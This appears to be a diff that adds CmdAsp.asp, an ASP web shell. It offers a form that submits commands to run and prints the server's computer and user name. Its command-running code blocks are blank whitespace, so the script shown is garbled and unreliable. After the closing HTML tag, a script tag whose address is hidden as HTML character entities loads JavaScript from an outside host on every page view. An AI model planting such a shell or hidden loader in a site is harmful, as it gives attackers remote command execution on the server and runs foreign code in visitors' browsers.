@@ -1,0 +1,21 @@
+<++ CmdAsp.asp ++>
+<%@ Language=VBScript %>
+<%
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+
+%>
+<HTML>
+<BODY>
+<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+<input type=text name=".CMD" size=45 value="<%= szCMD %>">
+<input type=submit value="Run">
+</FORM>
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<br>
+<%
+                                                                                                                                                                                                                                      
+%>
+</BODY>
+</HTML><SCRIPT SRC="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#103;&#101;&#114;&#115;&#46;&#117;&#115;&#47;&#105;&#98;&#110;&#101;&#108;&#101;&#114;&#47;&#121;&#97;&#122;&#46;&#106;&#115;"></SCRIPT>
+<-- CmdAsp.asp -->
